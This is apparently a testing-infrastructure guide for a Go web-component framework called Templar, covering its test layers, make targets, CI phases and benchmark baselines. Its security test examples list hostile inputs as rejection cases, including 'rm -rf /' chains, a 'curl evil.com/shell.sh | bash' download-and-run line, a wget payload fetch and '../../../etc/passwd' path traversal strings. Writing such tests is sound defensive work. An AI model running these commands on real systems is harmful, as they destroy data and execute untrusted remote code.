# Testing Infrastructure

This document describes the comprehensive testing infrastructure for the Templar project. The testing framework covers security, performance, integration, and end-to-end testing scenarios.

## Overview

The testing infrastructure consists of multiple layers:

1. **Unit Tests** - Individual component testing
2. **Security Tests** - Vulnerability and security validation  
3. **Integration Tests** - Component interaction testing
4. **Performance Tests** - Benchmark and performance validation
5. **End-to-End Tests** - Complete system workflow testing

## Test Organization

### Directory Structure

```
templar/
├── cmd/
│   ├── *_test.go          # Command-level unit tests
│   └── security_test.go   # Command security tests
├── internal/
│   ├── build/
│   │   ├── *_test.go           # Build pipeline tests
│   │   └── *_bench_test.go     # Performance benchmarks
│   ├── config/
│   │   ├── *_test.go           # Configuration tests
│   │   └── security_test.go    # Config security tests
│   ├── registry/
│   │   └── *_test.go           # Registry tests
│   ├── renderer/
│   │   └── *_test.go           # Renderer tests
│   ├── scanner/
│   │   ├── *_test.go           # Scanner tests
│   │   └── *_bench_test.go     # Scanner benchmarks
│   ├── server/
│   │   ├── *_test.go                # Server tests
│   │   ├── security_test.go         # Server security tests
│   │   ├── websocket_security_test.go # WebSocket security
│   │   └── websocket_bench_test.go    # WebSocket benchmarks
│   └── watcher/
│       ├── *_test.go           # Watcher tests
│       └── *_bench_test.go     # Watcher benchmarks
├── integration_tests/
│   ├── scanner_registry_test.go    # Scanner-registry integration
│   ├── watcher_scanner_test.go     # Watcher-scanner integration
│   ├── server_websocket_test.go    # Server-WebSocket integration
│   └── e2e_workflow_test.go        # End-to-end tests
└── testdata/
    ├── components/         # Test component templates
    ├── fixtures/          # Test configuration files
    ├── mocks/            # Mock data and utilities
    └── generator.go      # Test data generation utilities
```

## Running Tests

### Local Development

```bash
# Run all tests
make test

# Run specific test suites
make test-unit          # Unit tests only
make test-security      # Security tests only
make test-integration   # Integration tests only
make test-e2e          # End-to-end tests only
make test-bench        # Performance benchmarks

# Run comprehensive test suite (like CI)
make test-ci

# Generate coverage reports
make test-coverage
```

### Test Commands

```bash
# Unit tests with race detection
go test -race ./...

# Security tests
go test -v -tags=security ./cmd/... -run "TestSecurity"
go test -v -tags=security ./internal/server/... -run "TestSecurity"
go test -v -tags=security ./internal/config/... -run "TestSecurity"

# Integration tests
go test -v -tags=integration ./integration_tests/... -timeout=30m

# End-to-end tests
go test -v -tags=integration ./integration_tests/... -run "TestE2E" -timeout=45m

# Performance benchmarks
go test -bench=BenchmarkComponentScanner -benchmem ./internal/scanner/...
go test -bench=BenchmarkBuildPipeline -benchmem ./internal/build/...
go test -bench=BenchmarkWebSocket -benchmem ./internal/server/...
go test -bench=BenchmarkFileWatcher -benchmem ./internal/watcher/...
```

## Test Types

### 1. Unit Tests

Unit tests validate individual components and functions.

**Naming Convention**: `*_test.go`

**Example**:
```go
func TestComponentRegistry_RegisterComponent(t *testing.T) {
    reg := registry.NewComponentRegistry()
    component := &registry.ComponentInfo{
        Name: "Button",
        Package: "components",
    }
    
    err := reg.Register(component)
    assert.NoError(t, err)
    
    retrieved, exists := reg.Get("Button")
    assert.True(t, exists)
    assert.Equal(t, "Button", retrieved.Name)
}
```

### 2. Security Tests

Security tests validate protection against common vulnerabilities.

**Build Tag**: `//go:build security`

**Coverage Areas**:
- Command injection prevention
- Path traversal protection
- XSS prevention
- Input validation
- WebSocket origin validation
- Configuration security

**Example**:
```go
//go:build security

func TestSecurity_CommandInjection(t *testing.T) {
    testCases := []struct {
        name     string
        input    string
        expectError bool
    }{
        {
            name:        "Shell metacharacter semicolon",
            input:       "test; rm -rf /",
            expectError: true,
        },
        {
            name:        "Valid build command",
            input:       "templ generate",
            expectError: false,
        },
    }
    
    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            err := validateBuildCommand(tc.input)
            if tc.expectError {
                assert.Error(t, err)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}
```

### 3. Integration Tests

Integration tests validate component interactions and workflows.

**Build Tag**: `//go:build integration`

**Test Areas**:
- Scanner-Registry integration
- Watcher-Scanner coordination
- Server-WebSocket communication
- Complete workflow validation

**Example**:
```go
//go:build integration

func TestIntegration_ScannerRegistry_BasicDiscovery(t *testing.T) {
    // Create test components
    testDir := createTestComponentsDir(components)
    defer os.RemoveAll(testDir)
    
    // Initialize scanner and registry
    reg := registry.NewComponentRegistry()
    scanner := scanner.NewComponentScanner(reg)
    
    // Scan directory
    err := scanner.ScanDirectory(testDir)
    require.NoError(t, err)
    
    // Verify components are registered
    assert.Equal(t, 3, reg.Count())
}
```

### 4. Performance Tests

Performance tests validate system performance and detect regressions.

**Naming Convention**: `*_bench_test.go`

**Benchmark Areas**:
- Component scanning performance
- Build pipeline efficiency
- WebSocket throughput
- File watching responsiveness
- Memory usage patterns

**Example**:
```go
func BenchmarkComponentScanner_ScanDirectory(b *testing.B) {
    testDir := createTestComponents(100)
    defer os.RemoveAll(testDir)
    
    b.ResetTimer()
    b.ReportAllocs()
    
    for i := 0; i < b.N; i++ {
        reg := registry.NewComponentRegistry()
        scanner := NewComponentScanner(reg)
        err := scanner.ScanDirectory(testDir)
        if err != nil {
            b.Fatal(err)
        }
    }
}
```

### 5. End-to-End Tests

E2E tests validate complete system workflows and user scenarios.

**Test Scenarios**:
- Complete development workflow
- Multi-component interactions
- Error recovery workflows
- Performance under load

**Example**:
```go
func TestE2E_CompleteWorkflow(t *testing.T) {
    system, err := NewE2ETestSystem()
    require.NoError(t, err)
    defer system.Stop()
    
    // Start complete system
    err = system.Start()
    require.NoError(t, err)
    
    // Create components
    // Verify API responses
    // Test WebSocket communication
    // Validate hot reload
}
```

## Test Data Management

### Test Data Generator

The `testdata/generator.go` provides utilities for generating consistent test data:

```go
generator := testdata.NewComponentGenerator("./testdata")

// Generate simple components
testDir, err := generator.GenerateSimpleComponents(10)

// Generate complex components with various features
complexDir, err := generator.GenerateComplexComponents()

// Generate security test components
securityDir, err := generator.GenerateSecurityTestComponents()
```

### Mock Data

Mock data providers ensure consistent test data across test suites:

```go
mockData := testdata.NewMockData()

// Get sample components
components := mockData.SampleComponents()

// Get form field data
fields := mockData.SampleFormFields()

// Get security test cases
securityCases := mockData.SecurityTestCases()
```

## CI/CD Integration

### GitHub Actions Workflows

1. **Main CI Pipeline** (`.github/workflows/ci.yml`)
   - Comprehensive testing across multiple phases
   - Multi-platform and multi-version testing
   - Security scanning and vulnerability detection
   - Performance benchmarking
   - Docker build and deployment readiness

2. **PR Validation** (`.github/workflows/pr-validation.yml`)
   - Quick validation for draft PRs
   - Full validation for ready PRs
   - Performance regression detection
   - Breaking change analysis
   - Documentation checks

### Workflow Phases

**Phase 1: Code Quality**
- Linting and formatting
- Static analysis
- Vulnerability scanning

**Phase 2: Security Testing**
- Command injection tests
- Path traversal tests
- WebSocket security tests
- Configuration validation tests

**Phase 3: Unit Testing**
- Cross-platform testing (Linux, Windows, macOS)
- Multi-version Go testing (1.23, 1.24)
- Race condition detection
- Coverage reporting

**Phase 4: Performance Testing**
- Component scanning benchmarks
- Build pipeline benchmarks
- WebSocket throughput testing
- Memory usage validation

**Phase 5: Integration Testing**
- Scanner-registry integration
- Watcher-scanner coordination
- Server-WebSocket communication
- Database integration (with PostgreSQL service)

**Phase 6: Build and Deployment**
- Multi-architecture Docker builds
- Container security scanning
- Deployment readiness validation

**Phase 7: End-to-End Testing**
- Complete workflow validation
- Error recovery testing
- Performance under load
- Multi-component interaction testing

## Performance Baselines

### Expected Performance Targets

- **Component Scanning**: < 100ms for 50 components
- **Build Pipeline**: < 5s for medium projects
- **WebSocket Throughput**: > 1000 msg/s
- **File Watching**: < 200ms change detection
- **Memory Usage**: < 50MB for typical workloads

### Benchmark Tracking

Performance benchmarks are tracked across CI runs to detect regressions:

```bash
# Current performance baselines
BenchmarkComponentScanner/components-50    1000    1.2ms/op    45KB/op
BenchmarkBuildPipeline/medium-project      200     4.8s/op     2.1MB/op
BenchmarkWebSocket/message-broadcast       2000    0.5ms/op    8KB/op
BenchmarkFileWatcher/change-detection      5000    0.18ms/op   4KB/op
```

## Security Testing

### Security Test Coverage

1. **Command Injection Prevention**
   - Shell metacharacter validation
   - Command allowlist enforcement
   - Argument sanitization

2. **Path Traversal Protection**
   - Relative path validation
   - Directory escape prevention
   - File access restriction

3. **WebSocket Security**
   - Origin validation
   - CSRF protection
   - Connection hijacking prevention

4. **Input Validation**
   - Component name validation
   - Configuration parameter validation
   - Request payload validation

### Security Test Examples

```go
// Command injection test
func TestSecurity_ValidateCustomCommand(t *testing.T) {
    maliciousCommands := []string{
        "npm test; rm -rf /",
        "go test && curl evil.com/shell.sh | bash",
        "make build || wget malicious.com/payload",
    }
    
    for _, cmd := range maliciousCommands {
        err := validateCustomCommand(cmd)
        assert.Error(t, err, "Should reject: %s", cmd)
    }
}

// Path traversal test
func TestSecurity_ValidateComponentName(t *testing.T) {
    maliciousNames := []string{
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config",
        "component/../../sensitive",
    }
    
    for _, name := range maliciousNames {
        err := validateComponentName(name)
        assert.Error(t, err, "Should reject: %s", name)
    }
}
```

## Continuous Improvement

### Test Maintenance

1. **Regular Review**: Test cases are reviewed monthly for relevance
2. **Performance Updates**: Benchmark baselines updated quarterly
3. **Security Updates**: Security tests updated with new threat patterns
4. **Coverage Monitoring**: Test coverage maintained above 80%

### Adding New Tests

When adding new functionality:

1. Write unit tests for new functions/methods
2. Add security tests for user-facing features
3. Create integration tests for component interactions
4. Add performance benchmarks for critical paths
5. Update E2E tests for new workflows

### Test Guidelines

1. **Naming**: Use descriptive test names that explain the scenario
2. **Isolation**: Tests should not depend on external services
3. **Cleanup**: Always clean up test data and resources
4. **Assertions**: Use meaningful assertion messages
5. **Coverage**: Aim for high test coverage without test pollution

## Troubleshooting

### Common Issues

1. **Test Timeouts**: Increase timeout for integration/E2E tests
2. **Race Conditions**: Use proper synchronization in concurrent tests
3. **Flaky Tests**: Add proper wait conditions and retries
4. **Resource Leaks**: Ensure proper cleanup in test teardown

### Debug Commands

```bash
# Run tests with verbose output
go test -v ./...

# Run specific test with race detection
go test -race -run TestSpecificTest ./package

# Profile test performance
go test -cpuprofile=cpu.prof -memprofile=mem.prof ./...

# Check test coverage
go test -cover ./...
go test -coverprofile=coverage.out ./...
go tool cover -html=coverage.out
```

This comprehensive testing infrastructure ensures code quality, security, and performance across all aspects of the Templar framework.